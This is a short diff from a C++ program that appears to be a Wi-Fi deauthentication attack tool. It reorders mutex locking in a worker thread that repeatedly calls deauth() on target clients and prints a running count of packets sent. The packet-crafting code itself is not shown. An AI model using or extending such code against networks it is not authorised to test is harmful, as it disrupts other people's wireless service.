@@ -204,26 +204,24 @@ int main(int argc, const char * argv[]) {
         fprintf(stdout, "\n");
         thread worker([&count, &ifname]{
             while (working) {
+                for (auto iter = specify.begin(); iter != specify.end(); iter++) {
+                    if (!working) break;
+                    DeauthClient & client = *iter;
+                    client.deauth(ifname);
+                    count++;
+                }
                 {
                     lock_guard<mutex> locker(global_mtx);
-                    
-                    for (auto iter = specify.begin(); iter != specify.end(); iter++) {
-                        if (!working) break;
-                        DeauthClient & client = *iter;
-                        client.deauth(ifname);
-                        count++;
-                    }
-                    
                     for (auto iter = deauth.begin(); iter != deauth.end(); iter++) {
                         if (!working) break;
                         DeauthClient & client = *iter;
                         client.deauth(ifname);
                         count++;
                     }
-                    if (!working) break;
-                    fprintf(stdout, "%llu deauthentication packets sent! [STA: %lu, AP: %lu]\r", count, stations.size(), APs.size());
-                    fflush(stdout);
                 }
+                if (!working) break;
+                fprintf(stdout, "%llu deauthentication packets sent! [STA: %lu, AP: %lu]\r", count, stations.size(), APs.size());
+                fflush(stdout);
                 usleep(5000);
             }
             deauth_done = true;
